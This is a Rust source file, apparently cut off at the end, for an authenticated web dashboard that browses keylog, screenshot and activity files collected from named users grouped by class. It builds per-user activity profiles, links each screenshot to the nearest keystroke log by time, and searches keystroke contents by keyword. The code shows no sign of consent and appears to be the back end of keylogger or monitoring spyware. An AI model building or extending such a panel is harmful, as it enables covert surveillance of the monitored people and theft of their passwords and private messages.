use axum::{
    Router,
    body::{Body, Bytes},
    extract::{Path, Query, State},
    http::{HeaderMap, HeaderName, HeaderValue, StatusCode, header},
    response::{Html, Response, IntoResponse},
    routing::get,
};
use base64::Engine;
use chrono::{DateTime, Datelike, Local, Timelike};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::{
    collections::{HashMap, HashSet},
    io::ErrorKind,
    path::PathBuf,
    sync::Arc,
};
use tokio::{
    fs,
    sync::RwLock,
    task::JoinSet,
    time::{Duration, Instant},
};
use tracing::{error, info, warn};

const INDEX_HTML: &str = include_str!("index.html");
const EROOR_RESPON: &str = include_str!("templates/404.html");
const PERFORMANCE_UTILS_JS: &str = include_str!("performance-utils.js");
const SERVICE_WORKER_JS: &str = include_str!("service-worker.js");

const CACHE_TTL: Duration = Duration::from_secs(10);
const SEARCH_CONCURRENCY: usize = 32;
const DEFAULT_FILES_PAGE_SIZE: usize = 50;
const MAX_FILES_PAGE_SIZE: usize = 200;
const DEFAULT_USERS_PAGE_SIZE: usize = 100;
const MAX_USERS_PAGE_SIZE: usize = 500;
const DEFAULT_SEARCH_LIMIT: usize = 50;
const MAX_SEARCH_LIMIT: usize = 200;
const DEFAULT_TEXT_PREVIEW_BYTES: usize = 96 * 1024;
const MAX_TEXT_PREVIEW_BYTES: usize = 512 * 1024;
const MAX_SEARCH_FILE_BYTES: u64 = 2 * 1024 * 1024;
const JSON_CONTENT_TYPE: &str = "application/json; charset=utf-8";
const HTML_CONTENT_TYPE: &str = "text/html; charset=utf-8";
const JS_CONTENT_TYPE: &str = "application/javascript; charset=utf-8";
const TEXT_CONTENT_TYPE: &str = "text/plain; charset=utf-8";
const JPEG_CONTENT_TYPE: &str = "image/jpeg";
const PNG_CONTENT_TYPE: &str = "image/png";
const BINARY_CONTENT_TYPE: &str = "application/octet-stream";
const API_CACHE_CONTROL: &str = "private, max-age=3, stale-while-revalidate=15";
const NO_STORE: &str = "no-store";
const HTML_CACHE_CONTROL: &str = "no-cache";
const STATIC_CACHE_CONTROL: &str = "public, max-age=86400";
const RAW_FILE_CACHE_CONTROL: &str = "private, max-age=300";
const SERVICE_WORKER_CACHE_CONTROL: &str = "no-cache";

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LocalFileMetadata {
    #[serde(default)]
    pub file_id: String,
    #[serde(default)]
    pub original_filename: String,
    #[serde(default)]
    pub data_type: String,
    #[serde(default)]
    pub user_name: String,
    #[serde(default)]
    pub user_class: String,
    #[serde(default)]
    pub client_version: String,
    #[serde(default = "now_local")]
    pub received_at: DateTime<Local>,
    #[serde(default)]
    pub file_size: u64,
    #[serde(default)]
    pub status: String,
    #[serde(default)]
    pub stored_path: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct DashboardFile {
    pub file_id: String,
    pub original_filename: String,
    pub data_type: String,
    pub user_name: String,
    pub user_class: String,
    pub client_version: String,
    pub received_at: DateTime<Local>,
    pub file_size: u64,
    pub status: String,
    pub stored_path: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct DashboardStats {
    pub total_files: u64,
    pub total_users: u64,
    pub total_size_bytes: u64,
    pub today_files: u64,
    pub by_type: HashMap<String, u64>,
    pub by_class: HashMap<String, u64>,
}

#[derive(Debug, Clone, Serialize)]
pub struct DashboardUser {
    pub name: String,
    pub class: String,
    pub file_count: u64,
    pub screenshot_count: u64,
    pub keylog_count: u64,
    pub activity_count: u64,
    pub total_size_bytes: u64,
    pub last_active: Option<DateTime<Local>>,
}

#[derive(Debug, Clone, Serialize)]
pub struct DashboardUserDetail {
    pub user_name: String,
    pub user_class: String,
    pub total_files: u64,
    pub total_size_bytes: u64,
    pub file_types: HashMap<String, u64>,
    pub last_active: Option<DateTime<Local>>,
    pub first_seen: Option<DateTime<Local>>,
}

#[derive(Debug, Deserialize)]
pub struct KeywordSearchQuery {
    pub q: String,
    pub limit: Option<usize>,
}

#[derive(Debug, Default, Deserialize)]
pub struct FilesQuery {
    pub page: Option<usize>,
    pub page_size: Option<usize>,
    pub q: Option<String>,
    pub data_type: Option<String>,
    #[serde(rename = "type")]
    pub type_alias: Option<String>,
    pub sort: Option<String>,
    pub user: Option<String>,
    pub class: Option<String>,
}

#[derive(Debug, Default, Deserialize)]
pub struct UsersQuery {
    pub page: Option<usize>,
    pub page_size: Option<usize>,
    pub q: Option<String>,
}

#[derive(Debug, Default, Deserialize)]
pub struct PreviewQuery {
    pub raw: Option<bool>,
    pub max_bytes: Option<usize>,
}

#[derive(Debug, Serialize)]
pub struct FilesPage {
    pub items: Vec<DashboardFile>,
    pub total: usize,
    pub page: usize,
    pub page_size: usize,
    pub total_pages: usize,
    pub has_more: bool,
}

#[derive(Debug, Serialize)]
pub struct UsersPage {
    pub items: Vec<DashboardUser>,
    pub total: usize,
    pub page: usize,
    pub page_size: usize,
    pub total_pages: usize,
    pub has_more: bool,
}

#[derive(Debug, Deserialize)]
struct DiskFileIndex {
    files_by_id: HashMap<String, LocalFileMetadata>,
}

struct DashboardSnapshot {
    refreshed_at: Instant,
    files: Vec<DashboardFile>,
    stats: DashboardStats,
    users: Vec<DashboardUser>,
    user_details: HashMap<String, DashboardUserDetail>,
    file_by_id: HashMap<String, usize>,
    files_by_user_type: HashMap<String, Vec<usize>>,
    stats_json: Bytes,
}

struct DashboardCache {
    snapshot: Option<Arc<DashboardSnapshot>>,
}

struct DashboardState {
    upload_root: PathBuf,
    auth_key: String,
    cache: RwLock<DashboardCache>,
}

fn now_local() -> DateTime<Local> {
    Local::now()
}

fn validate_auth(headers: &HeaderMap, key: &str) -> bool {
    headers
        .get("X-API-Key")
        .and_then(|v| v.to_str().ok())
        .is_some_and(|v| v == key)
}

fn user_key(user_class: &str, user_name: &str) -> String {
    let mut key = String::with_capacity(user_class.len() + user_name.len() + 1);
    key.push_str(user_class);
    key.push('\x1f');
    key.push_str(user_name);
    key
}

fn user_type_key(user_class: &str, user_name: &str, data_type: &str) -> String {
    let mut key = String::with_capacity(user_class.len() + user_name.len() + data_type.len() + 2);
    key.push_str(user_class);
    key.push('\x1f');
    key.push_str(user_name);
    key.push('\x1f');
    key.push_str(data_type);
    key
}

fn normalize_display_name(original_filename: String, data_type: &str) -> String {
    let lower = original_filename.to_ascii_lowercase();

    if data_type == "screenshot"
        && !lower.ends_with(".jpg")
        && !lower.ends_with(".jpeg")
        && !lower.ends_with(".png")
    {
        format!("{original_filename}.jpg")
    } else if matches!(data_type, "keylog" | "activity") && !lower.ends_with(".txt") {
        format!("{original_filename}.txt")
    } else {
        original_filename
    }
}

fn push_to_dashboard(files: &mut Vec<DashboardFile>, file_data: LocalFileMetadata) {
    if file_data.file_id.is_empty() || file_data.stored_path.is_empty() {
        return;
    }

    let original_filename =
        normalize_display_name(file_data.original_filename, file_data.data_type.as_str());

    files.push(DashboardFile {
        file_id: file_data.file_id,
        original_filename,
        data_type: file_data.data_type,
        user_name: file_data.user_name,
        user_class: file_data.user_class,
        client_version: file_data.client_version,
        received_at: file_data.received_at,
        file_size: file_data.file_size,
        status: file_data.status,
        stored_path: file_data.stored_path,
    });
}

fn json_bytes<T: Serialize>(value: &T, fallback: &'static [u8]) -> Bytes {
    match serde_json::to_vec(value) {
        Ok(bytes) => Bytes::from(bytes),
        Err(error) => {
            error!("Failed to serialize dashboard response: {}", error);
            Bytes::from_static(fallback)
        }
    }
}

impl DashboardSnapshot {
    fn new(mut files: Vec<DashboardFile>) -> Self {
        files.sort_unstable_by(|a, b| b.received_at.cmp(&a.received_at));

        let today = Local::now().date_naive();
        let mut total_size_bytes = 0;
        let mut today_files = 0;
        let mut unique_users = HashSet::new();
        let mut by_type = HashMap::new();
        let mut by_class = HashMap::new();
        let mut users: HashMap<String, DashboardUser> = HashMap::new();
        let mut user_details: HashMap<String, DashboardUserDetail> = HashMap::new();
        let mut file_by_id = HashMap::with_capacity(files.len());
        let mut files_by_user_type: HashMap<String, Vec<usize>> = HashMap::new();

        for (index, file) in files.iter().enumerate() {
            total_size_bytes += file.file_size;
            if file.received_at.date_naive() == today {
                today_files += 1;
            }

            let user_key = user_key(&file.user_class, &file.user_name);
            unique_users.insert(user_key.clone());
            *by_type.entry(file.data_type.clone()).or_insert(0) += 1;
            *by_class.entry(file.user_class.clone()).or_insert(0) += 1;

            let user = users
                .entry(user_key.clone())
                .or_insert_with(|| DashboardUser {
                    name: file.user_name.clone(),
                    class: file.user_class.clone(),
                    file_count: 0,
                    screenshot_count: 0,
                    keylog_count: 0,
                    activity_count: 0,
                    total_size_bytes: 0,
                    last_active: None,
                });
            user.file_count += 1;
            user.total_size_bytes += file.file_size;
            match file.data_type.as_str() {
                "screenshot" => user.screenshot_count += 1,
                "keylog" => user.keylog_count += 1,
                "activity" => user.activity_count += 1,
                _ => {}
            }
            if user
                .last_active
                .as_ref()
                .is_none_or(|last_active| file.received_at > *last_active)
            {
                user.last_active = Some(file.received_at);
            }

            let detail = user_details
                .entry(user_key)
                .or_insert_with(|| DashboardUserDetail {
                    user_name: file.user_name.clone(),
                    user_class: file.user_class.clone(),
                    total_files: 0,
                    total_size_bytes: 0,
                    file_types: HashMap::new(),
                    last_active: None,
                    first_seen: None,
                });

            detail.total_files += 1;
            detail.total_size_bytes += file.file_size;
            *detail.file_types.entry(file.data_type.clone()).or_insert(0) += 1;

            if detail
                .last_active
                .as_ref()
                .is_none_or(|last_active| file.received_at > *last_active)
            {
                detail.last_active = Some(file.received_at);
            }

            if detail
                .first_seen
                .as_ref()
                .is_none_or(|first_seen| file.received_at < *first_seen)
            {
                detail.first_seen = Some(file.received_at);
            }

            file_by_id.entry(file.file_id.clone()).or_insert(index);
            files_by_user_type
                .entry(user_type_key(
                    &file.user_class,
                    &file.user_name,
                    &file.data_type,
                ))
                .or_default()
                .push(index);
        }

        let mut users: Vec<_> = users.into_values().collect();
        users.sort_unstable_by(|a, b| {
            b.file_count
                .cmp(&a.file_count)
                .then_with(|| a.name.cmp(&b.name))
                .then_with(|| a.class.cmp(&b.class))
        });

        let stats = DashboardStats {
            total_files: files.len() as u64,
            total_users: unique_users.len() as u64,
            total_size_bytes,
            today_files,
            by_type,
            by_class,
        };

        let stats_json = json_bytes(&stats, br#"{"total_files":0,"total_users":0,"total_size_bytes":0,"today_files":0,"by_type":{},"by_class":{}}"#);

        Self {
            refreshed_at: Instant::now(),
            files,
            stats,
            users,
            user_details,
            file_by_id,
            files_by_user_type,
            stats_json,
        }
    }
}

async fn load_all_files_from_disk(upload_root: &PathBuf) -> Vec<DashboardFile> {
    if let Some(files) = load_files_from_index(upload_root).await {
        return files;
    }

    scan_metadata_files(upload_root.clone()).await
}

async fn load_files_from_index(upload_root: &PathBuf) -> Option<Vec<DashboardFile>> {
    let index_path = upload_root.join("_index.json");
    let content = match fs::read_to_string(&index_path).await {
        Ok(content) => content,
        Err(error) => {
            if error.kind() != ErrorKind::NotFound {
                warn!("Failed to read dashboard index {:?}: {}", index_path, error);
            }
            return None;
        }
    };

    if let Ok(index) = serde_json::from_str::<DiskFileIndex>(&content) {
        let mut files = Vec::with_capacity(index.files_by_id.len());
        for file_data in index.files_by_id.into_values() {
            push_to_dashboard(&mut files, file_data);
        }
        return Some(files);
    }

    if let Ok(file_map) = serde_json::from_str::<HashMap<String, LocalFileMetadata>>(&content) {
        let mut files = Vec::with_capacity(file_map.len());
        for file_data in file_map.into_values() {
            push_to_dashboard(&mut files, file_data);
        }
        return Some(files);
    }

    warn!(
        "Dashboard index {:?} is not in a supported format",
        index_path
    );
    None
}

async fn scan_metadata_files(upload_root: PathBuf) -> Vec<DashboardFile> {
    match tokio::task::spawn_blocking(move || {
        let mut files = Vec::new();

        if !upload_root.exists() {
            return files;
        }

        for entry in walkdir::WalkDir::new(&upload_root)
            .follow_links(false)
            .into_iter()
            .filter_map(Result::ok)
        {
            if !entry.file_type().is_file() {
                continue;
            }

            let path = entry.path();
            if path.file_name().and_then(|name| name.to_str()) == Some("_index.json") {
                continue;
            }

            let is_json = path
                .extension()
                .and_then(|ext| ext.to_str())
                .is_some_and(|ext| ext.eq_ignore_ascii_case("json"));

            if !is_json {
                continue;
            }

            let Ok(content) = std::fs::read_to_string(path) else {
                continue;
            };

            if let Ok(file_data) = serde_json::from_str::<LocalFileMetadata>(&content) {
                push_to_dashboard(&mut files, file_data);
            } else if let Ok(file_map) =
                serde_json::from_str::<HashMap<String, LocalFileMetadata>>(&content)
            {
                for file_data in file_map.into_values() {
                    push_to_dashboard(&mut files, file_data);
                }
            }
        }

        files
    })
    .await
    {
        Ok(files) => files,
        Err(error) => {
            error!("Dashboard metadata scan task failed: {}", error);
            Vec::new()
        }
    }
}

async fn get_snapshot(state: &Arc<DashboardState>) -> Arc<DashboardSnapshot> {
    {
        let cache = state.cache.read().await;
        if let Some(snapshot) = &cache.snapshot {
            if snapshot.refreshed_at.elapsed() <= CACHE_TTL {
                return Arc::clone(snapshot);
            }
        }
    }

    let mut cache = state.cache.write().await;
    if let Some(snapshot) = &cache.snapshot {
        if snapshot.refreshed_at.elapsed() <= CACHE_TTL {
            return Arc::clone(snapshot);
        }
    }

    let files = load_all_files_from_disk(&state.upload_root).await;
    let snapshot = Arc::new(DashboardSnapshot::new(files));
    cache.snapshot = Some(Arc::clone(&snapshot));
    snapshot
}

fn normalize_page(page: Option<usize>) -> usize {
    page.unwrap_or(1).max(1)
}

fn normalize_page_size(page_size: Option<usize>, default_size: usize, max_size: usize) -> usize {
    page_size.unwrap_or(default_size).clamp(1, max_size)
}

fn page_window(total: usize, page: usize, page_size: usize) -> (usize, usize, usize, bool) {
    let total_pages = total.div_ceil(page_size).max(1);
    let safe_page = page.min(total_pages);
    let start = ((safe_page - 1) * page_size).min(total);
    let end = (start + page_size).min(total);
    (start, end, total_pages, safe_page < total_pages)
}

fn query_file_type(query: &FilesQuery) -> Option<&str> {
    query
        .data_type
        .as_deref()
        .or(query.type_alias.as_deref())
        .map(str::trim)
        .filter(|value| !value.is_empty())
}

fn file_matches_query(file: &DashboardFile, query: &FilesQuery) -> bool {
    if let Some(data_type) = query_file_type(query) {
        if file.data_type != data_type {
            return false;
        }
    }

    if let Some(user) = query
        .user
        .as_deref()
        .map(str::trim)
        .filter(|v| !v.is_empty())
    {
        if file.user_name != user {
            return false;
        }
    }

    if let Some(class) = query
        .class
        .as_deref()
        .map(str::trim)
        .filter(|v| !v.is_empty())
    {
        if file.user_class != class {
            return false;
        }
    }

    if let Some(q) = query.q.as_deref().map(str::trim).filter(|v| !v.is_empty()) {
        let q = q.to_lowercase();
        let filename = file.original_filename.to_lowercase();
        let user_name = file.user_name.to_lowercase();
        let user_class = file.user_class.to_lowercase();

        if !filename.contains(&q) && !user_name.contains(&q) && !user_class.contains(&q) {
            return false;
        }
    }

    true
}

fn files_page(snapshot: &DashboardSnapshot, query: &FilesQuery) -> FilesPage {
    let page = normalize_page(query.page);
    let page_size = normalize_page_size(
        query.page_size,
        DEFAULT_FILES_PAGE_SIZE,
        MAX_FILES_PAGE_SIZE,
    );
    let mut files: Vec<&DashboardFile> = snapshot
        .files
        .iter()
        .filter(|file| file_matches_query(file, query))
        .collect();

    match query.sort.as_deref().unwrap_or("newest") {
        "oldest" => files.sort_unstable_by(|a, b| a.received_at.cmp(&b.received_at)),
        "size" => files.sort_unstable_by(|a, b| b.file_size.cmp(&a.file_size)),
        "name" => files.sort_unstable_by(|a, b| a.original_filename.cmp(&b.original_filename)),
        _ => {}
    }

    let total = files.len();
    let (start, end, total_pages, has_more) = page_window(total, page, page_size);
    let items = files[start..end]
        .iter()
        .map(|file| (*file).clone())
        .collect();

    FilesPage {
        items,
        total,
        page: page.min(total_pages),
        page_size,
        total_pages,
        has_more,
    }
}

fn users_page(snapshot: &DashboardSnapshot, query: &UsersQuery) -> UsersPage {
    let page = normalize_page(query.page);
    let page_size = normalize_page_size(
        query.page_size,
        DEFAULT_USERS_PAGE_SIZE,
        MAX_USERS_PAGE_SIZE,
    );
    let mut users: Vec<&DashboardUser> = snapshot.users.iter().collect();

    if let Some(q) = query.q.as_deref().map(str::trim).filter(|v| !v.is_empty()) {
        let q = q.to_lowercase();
        users.retain(|user| {
            user.name.to_lowercase().contains(&q) || user.class.to_lowercase().contains(&q)
        });
    }

    let total = users.len();
    let (start, end, total_pages, has_more) = page_window(total, page, page_size);
    let items = users[start..end]
        .iter()
        .map(|user| (*user).clone())
        .collect();

    UsersPage {
        items,
        total,
        page: page.min(total_pages),
        page_size,
        total_pages,
        has_more,
    }
}

fn content_type_for_file(file: &DashboardFile) -> &'static str {
    let lower = file.original_filename.to_ascii_lowercase();
    if lower.ends_with(".png") {
        PNG_CONTENT_TYPE
    } else if file.data_type == "screenshot" || lower.ends_with(".jpg") || lower.ends_with(".jpeg")
    {
        JPEG_CONTENT_TYPE
    } else if matches!(file.data_type.as_str(), "keylog" | "activity") {
        TEXT_CONTENT_TYPE
    } else {
        BINARY_CONTENT_TYPE
    }
}

fn truncated_text(bytes: &[u8], max_bytes: usize) -> (String, bool) {
    let limit = max_bytes.min(bytes.len());
    let mut text = String::from_utf8_lossy(&bytes[..limit]).to_string();
    while !text.is_char_boundary(text.len()) {
        text.pop();
    }
    (text, bytes.len() > limit)
}

fn dashboard_analytics(snapshot: &DashboardSnapshot) -> serde_json::Value {
    let today = Local::now().date_naive();
    let first_day = today - chrono::Duration::days(13);
    let mut timeline = vec![0_u64; 14];
    let mut hourly = vec![0_u64; 24];
    let mut dow = vec![0_u64; 7];
    let mut heatmap = vec![vec![0_u64; 24]; 7];

    for file in &snapshot.files {
        let date = file.received_at.date_naive();
        if date >= first_day && date <= today {
            let offset = (date - first_day).num_days() as usize;
            if let Some(value) = timeline.get_mut(offset) {
                *value += 1;
            }
        }

        let hour = file.received_at.hour() as usize;
        let day = file.received_at.weekday().num_days_from_sunday() as usize;
        hourly[hour] += 1;
        dow[day] += 1;
        heatmap[day][hour] += 1;
    }

    let timeline = timeline
        .into_iter()
        .enumerate()
        .map(|(index, count)| {
            let date = first_day + chrono::Duration::days(index as i64);
            json!({
                "label": date.format("%d %b").to_string(),
                "count": count,
            })
        })
        .collect::<Vec<_>>();

    let mut top_users = snapshot.users.clone();
    top_users.truncate(10);

    let mut top_user_sizes = snapshot.users.clone();
    top_user_sizes.sort_unstable_by(|a, b| {
        b.total_size_bytes
            .cmp(&a.total_size_bytes)
            .then_with(|| a.name.cmp(&b.name))
            .then_with(|| a.class.cmp(&b.class))
    });
    top_user_sizes.truncate(10);

    let mut ss_vs_kl = snapshot.users.clone();
    ss_vs_kl.truncate(8);

    json!({
        "total_files": snapshot.stats.total_files,
        "total_size_bytes": snapshot.stats.total_size_bytes,
        "avg_size_bytes": if snapshot.stats.total_files > 0 {
            snapshot.stats.total_size_bytes / snapshot.stats.total_files
        } else {
            0
        },
        "screenshots": snapshot.stats.by_type.get("screenshot").copied().unwrap_or(0),
        "keylogs": snapshot.stats.by_type.get("keylog").copied().unwrap_or(0),
        "user_file_avg": if snapshot.stats.total_users > 0 {
            snapshot.stats.total_files as f64 / snapshot.stats.total_users as f64
        } else {
            0.0
        },
        "timeline": timeline,
        "hourly": hourly,
        "dow": dow,
        "heatmap": heatmap,
        "type_counts": snapshot.stats.by_type.clone(),
        "class_counts": snapshot.stats.by_class.clone(),
        "top_users": top_users,
        "top_user_sizes": top_user_sizes,
        "ss_vs_kl": ss_vs_kl,
    })
}

fn response_with(
    status: StatusCode,
    content_type: &'static str,
    cache_control: &'static str,
    body: Body,
) -> Response {
    let mut response = Response::new(body);
    *response.status_mut() = status;
    response
        .headers_mut()
        .insert(header::CONTENT_TYPE, HeaderValue::from_static(content_type));
    response.headers_mut().insert(
        header::CACHE_CONTROL,
        HeaderValue::from_static(cache_control),
    );
    response
}

fn text_response(
    status: StatusCode,
    content_type: &'static str,
    cache_control: &'static str,
    body: &'static str,
) -> Response {
    response_with(status, content_type, cache_control, Body::from(body))
}

fn json_cached_response(bytes: Bytes) -> Response {
    response_with(
        StatusCode::OK,
        JSON_CONTENT_TYPE,
        API_CACHE_CONTROL,
        Body::from(bytes),
    )
}

fn json_value_response<T: Serialize>(status: StatusCode, value: &T) -> Response {
    response_with(
        status,
        JSON_CONTENT_TYPE,
        NO_STORE,
        Body::from(json_bytes(value, br#"{"error":"serialization failed"}"#)),
    )
}

fn json_error(status: StatusCode, message: &'static str) -> Response {
    json_value_response(status, &json!({ "error": message }))
}

async fn dashboard_page() -> Response {
    text_response(
        StatusCode::OK,
        HTML_CONTENT_TYPE,
        HTML_CACHE_CONTROL,
        INDEX_HTML,
    )
}

async fn performance_utils_js() -> Response {
    text_response(
        StatusCode::OK,
        JS_CONTENT_TYPE,
        STATIC_CACHE_CONTROL,
        PERFORMANCE_UTILS_JS,
    )
}

async fn service_worker_js() -> Response {
    let mut response = text_response(
        StatusCode::OK,
        JS_CONTENT_TYPE,
        SERVICE_WORKER_CACHE_CONTROL,
        SERVICE_WORKER_JS,
    );
    response.headers_mut().insert(
        HeaderName::from_static("service-worker-allowed"),
        HeaderValue::from_static("/"),
    );
    response
}

async fn api_get_stats(State(state): State<Arc<DashboardState>>, headers: HeaderMap) -> Response {
    if !validate_auth(&headers, &state.auth_key) {
        return json_error(StatusCode::UNAUTHORIZED, "Unauthorized");
    }

    let snapshot = get_snapshot(&state).await;
    json_cached_response(snapshot.stats_json.clone())
}

async fn api_get_files(
    State(state): State<Arc<DashboardState>>,
    Query(params): Query<FilesQuery>,
    headers: HeaderMap,
) -> Response {
    if !validate_auth(&headers, &state.auth_key) {
        return json_error(StatusCode::UNAUTHORIZED, "Unauthorized");
    }

    let snapshot = get_snapshot(&state).await;
    json_value_response(StatusCode::OK, &files_page(&snapshot, &params))
}

async fn api_get_all_users(
    State(state): State<Arc<DashboardState>>,
    Query(params): Query<UsersQuery>,
    headers: HeaderMap,
) -> Response {
    if !validate_auth(&headers, &state.auth_key) {
        return json_error(StatusCode::UNAUTHORIZED, "Unauthorized");
    }

    let snapshot = get_snapshot(&state).await;
    json_value_response(StatusCode::OK, &users_page(&snapshot, &params))
}

async fn api_get_analytics(
    State(state): State<Arc<DashboardState>>,
    headers: HeaderMap,
) -> Response {
    if !validate_auth(&headers, &state.auth_key) {
        return json_error(StatusCode::UNAUTHORIZED, "Unauthorized");
    }

    let snapshot = get_snapshot(&state).await;
    json_value_response(StatusCode::OK, &dashboard_analytics(&snapshot))
}

async fn api_get_user_detail_by_class(
    State(state): State<Arc<DashboardState>>,
    Path((class, username)): Path<(String, String)>,
    headers: HeaderMap,
) -> Response {
    if !validate_auth(&headers, &state.auth_key) {
        return json_error(StatusCode::UNAUTHORIZED, "Unauthorized");
    }

    let snapshot = get_snapshot(&state).await;
    let key = user_key(&class, &username);
    match snapshot.user_details.get(&key) {
        Some(detail) => json_value_response(StatusCode::OK, detail),
        None => json_error(StatusCode::NOT_FOUND, "User not found"),
    }
}

async fn api_get_user_detail(
    State(state): State<Arc<DashboardState>>,
    Path(username): Path<String>,
    headers: HeaderMap,
) -> Response {
    if !validate_auth(&headers, &state.auth_key) {
        return json_error(StatusCode::UNAUTHORIZED, "Unauthorized");
    }

    let snapshot = get_snapshot(&state).await;
    let mut matches = snapshot
        .user_details
        .values()
        .filter(|detail| detail.user_name == username);

    match (matches.next(), matches.next()) {
        (Some(detail), None) => json_value_response(StatusCode::OK, detail),
        (Some(_), Some(_)) => json_error(
            StatusCode::BAD_REQUEST,
            "User name is ambiguous; include class in the request",
        ),
        _ => json_error(StatusCode::NOT_FOUND, "User not found"),
    }
}

async fn api_get_user_files(
    State(state): State<Arc<DashboardState>>,
    Path((class, username)): Path<(String, String)>,
    Query(mut params): Query<FilesQuery>,
    headers: HeaderMap,
) -> Response {
    if !validate_auth(&headers, &state.auth_key) {
        return json_error(StatusCode::UNAUTHORIZED, "Unauthorized");
    }

    params.class = Some(class);
    params.user = Some(username);
    let snapshot = get_snapshot(&state).await;
    json_value_response(StatusCode::OK, &files_page(&snapshot, &params))
}

async fn api_file_preview(
    State(state): State<Arc<DashboardState>>,
    Path(file_id): Path<String>,
    Query(params): Query<PreviewQuery>,
    headers: HeaderMap,
) -> Response {
    if !validate_auth(&headers, &state.auth_key) {
        return json_error(StatusCode::UNAUTHORIZED, "Unauthorized");
    }

    let snapshot = get_snapshot(&state).await;
    let Some(file) = snapshot
        .file_by_id
        .get(&file_id)
        .and_then(|index| snapshot.files.get(*index))
        .cloned()
    else {
        return json_error(StatusCode::NOT_FOUND, "File not found");
    };

    let bytes = match fs::read(&file.stored_path).await {
        Ok(bytes) => bytes,
        Err(error) => {
            error!(
                "Failed to read preview file {:?}: {}",
                file.stored_path, error
            );
            return json_error(StatusCode::INTERNAL_SERVER_ERROR, "Failed to read file");
        }
    };

    if params.raw.unwrap_or(false) {
        return response_with(
            StatusCode::OK,
            content_type_for_file(&file),
            RAW_FILE_CACHE_CONTROL,
            Body::from(bytes),
        );
    }

    if file.data_type == "screenshot" {
        let base64 = base64::engine::general_purpose::STANDARD.encode(bytes);
        json_value_response(
            StatusCode::OK,
            &json!({
                "content": base64,
                "type": "image",
                "truncated": false
            }),
        )
    } else {
        let max_bytes = params
            .max_bytes
            .unwrap_or(DEFAULT_TEXT_PREVIEW_BYTES)
            .clamp(1, MAX_TEXT_PREVIEW_BYTES);
        let (content, truncated) = truncated_text(&bytes, max_bytes);
        json_value_response(
            StatusCode::OK,
            &json!({
                "content": content,
                "type": "text",
                "truncated": truncated,
                "bytes_read": content.len(),
                "file_size": bytes.len()
            }),
        )
    }
}

fn nearest_file_for_type(
    snapshot: &DashboardSnapshot,
    user_class: &str,
    user_name: &str,
    exclude_id: &str,
    data_type: &str,
    target_ts: i64,
) -> Option<serde_json::Value> {
    let key = user_type_key(user_class, user_name, data_type);
    let indexes = snapshot.files_by_user_type.get(&key)?;

    indexes
        .iter()
        .filter_map(|index| snapshot.files.get(*index))
        .filter(|file| file.file_id != exclude_id)
        .min_by_key(|file| (file.received_at.timestamp() - target_ts).unsigned_abs())
        .map(|file| {
            let diff_secs = (file.received_at.timestamp() - target_ts).abs();
            json!({
                "file_id": file.file_id,
                "original_filename": file.original_filename,
                "data_type": file.data_type,
                "received_at": file.received_at,
                "file_size": file.file_size,
                "time_diff_secs": diff_secs,
            })
        })
}

async fn api_correlate(
    State(state): State<Arc<DashboardState>>,
    Path(file_id): Path<String>,
    headers: HeaderMap,
) -> Response {
    if !validate_auth(&headers, &state.auth_key) {
        return json_error(StatusCode::UNAUTHORIZED, "Unauthorized");
    }

    let snapshot = get_snapshot(&state).await;
    let Some(target) = snapshot
        .file_by_id
        .get(&file_id)
        .and_then(|index| snapshot.files.get(*index))
        .cloned()
    else {
        return json_error(StatusCode::NOT_FOUND, "File not found");
    };

    let target_ts = target.received_at.timestamp();
    let nearest_keylog = nearest_file_for_type(
        &snapshot,
        &target.user_class,
        &target.user_name,
        &file_id,
        "keylog",
        target_ts,
    );
    let nearest_activity = nearest_file_for_type(
        &snapshot,
        &target.user_class,
        &target.user_name,
        &file_id,
        "activity",
        target_ts,
    );

    json_value_response(
        StatusCode::OK,
        &json!({
            "target_file_id": target.file_id,
            "target_user": target.user_name,
            "target_time": target.received_at,
            "nearest_keylog": nearest_keylog,
            "nearest_activity": nearest_activity,
        }),
    )
}

async fn search_file_for_keyword(
    file: DashboardFile,
    keyword: String,
) -> Option<serde_json::Value> {
    if file.file_size > MAX_SEARCH_FILE_BYTES {
        return None;
    }

    let bytes = fs::read(&file.stored_path).await.ok()?;
    let content = String::from_utf8_lossy(&bytes);

    if !content.to_lowercase().contains(&keyword) {
        return None;
    }

    Some(json!({
        "user_name": file.user_name,
        "user_class": file.user_class,
        "filename": file.original_filename,
        "data_type": file.data_type,
        "timestamp": file.received_at,
        "file_id": file.file_id,
    }))
}

async fn collect_next_search_result(
    tasks: &mut JoinSet<Option<serde_json::Value>>,
    matches: &mut Vec<serde_json::Value>,
) {
    if let Some(result) = tasks.join_next().await {
        match result {
            Ok(Some(value)) => matches.push(value),
            Ok(None) => {}
            Err(error) => warn!("Dashboard search task failed: {}", error),
        }
    }
}

async fn api_search_keyword(
    State(state): State<Arc<DashboardState>>,
    Query(params): Query<KeywordSearchQuery>,
    headers: HeaderMap,
) -> Response {
    if !validate_auth(&headers, &state.auth_key) {
        return json_error(StatusCode::UNAUTHORIZED, "Unauthorized");
    }

    let keyword = params.q.trim().to_lowercase();
    if keyword.is_empty() {
        return json_value_response(
            StatusCode::OK,
            &json!({
                "keyword": keyword,
                "matches": []
            }),
        );
    }

    let snapshot = get_snapshot(&state).await;
    let result_limit = params
        .limit
        .unwrap_or(DEFAULT_SEARCH_LIMIT)
        .clamp(1, MAX_SEARCH_LIMIT);
    let mut tasks = JoinSet::new();
    let mut matches = Vec::new();

    'search: for file in snapshot
        .files
        .iter()
        .filter(|file| matches!(file.data_type.as_str(), "keylog" | "activity"))
        .cloned()
    {
        while tasks.len() >= SEARCH_CONCURRENCY {
            collect_next_search_result(&mut tasks, &mut matches).await;
            if matches.len() >= result_limit {
                break 'search;
            }
        }

        let task_keyword = keyword.clone();
        tasks.spawn(search_file_for_keyword(file, task_keyword));
    }

    while !tasks.is_empty() && matches.len() < result_limit {
        collect_next_search_result(&mut tasks, &mut matches).await;
    }

    matches.sort_unstable_by(|a, b| {
        let a_ts = a["timestamp"].as_str().unwrap_or_default();
        let b_ts = b["timestamp"].as_str().unwrap_or_default();
        b_ts.cmp(a_ts)
    });
    matches.truncate(result_limit);

    json_value_response(
        StatusCode::OK,
        &json!({
            "keyword": keyword,
            "matches": matches,
            "limit": result_limit
        }),
    )
}

async fn handler_404() -> impl IntoResponse {
    // Membaca file HTML 404 kamu saat kompilasi
    let body = EROOR_RESPON; // Sesuaikan dengan jalur file HTML-mu
    
